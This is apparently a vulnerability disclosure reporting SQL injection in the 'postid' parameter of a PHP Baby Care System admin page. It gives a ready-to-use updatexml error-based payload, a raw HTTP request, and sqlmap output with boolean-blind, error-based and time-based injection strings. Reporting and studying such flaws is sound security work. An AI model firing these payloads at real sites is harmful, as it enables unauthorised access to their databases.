## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/post.php
![image](https://user-images.githubusercontent.com/54017627/160947343-4af02ffc-dc9a-4a18-a89f-030cff9b88c3.png)

Vulnerability location: /BabyCare/admin.php?id=posts&action=display&value=1&postid= //postid is Injection point

[+]Payload:  /BabyCare/admin.php?id=posts&action=display&value=1&postid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //postid is Injection point

```sql
GET /BabyCare/admin.php?id=posts&action=display&value=1&postid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=7r2orfo1e9b49mg28f5ke9bdjv
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/160947460-e04fc6ea-01de-4030-9bef-14ca8412e23a.png)

```sql
---
Parameter: postid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=posts&action=display&value=1&postid=1' RLIKE (SELECT (CASE WHEN (5665=5665) THEN 1 ELSE 0x28 END))-- GiVX

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=posts&action=display&value=1&postid=1' AND (SELECT 7280 FROM(SELECT COUNT(*),CONCAT(0x71627a7071,(SELECT (ELT(7280=7280,1))),0x71787a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- PXXk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=posts&action=display&value=1&postid=1' AND (SELECT 3574 FROM (SELECT(SLEEP(5)))SpIf)-- qCfa
---
```

![image](https://user-images.githubusercontent.com/54017627/160947103-63d81371-a6d8-4430-96a4-3cb300c56fef.png)
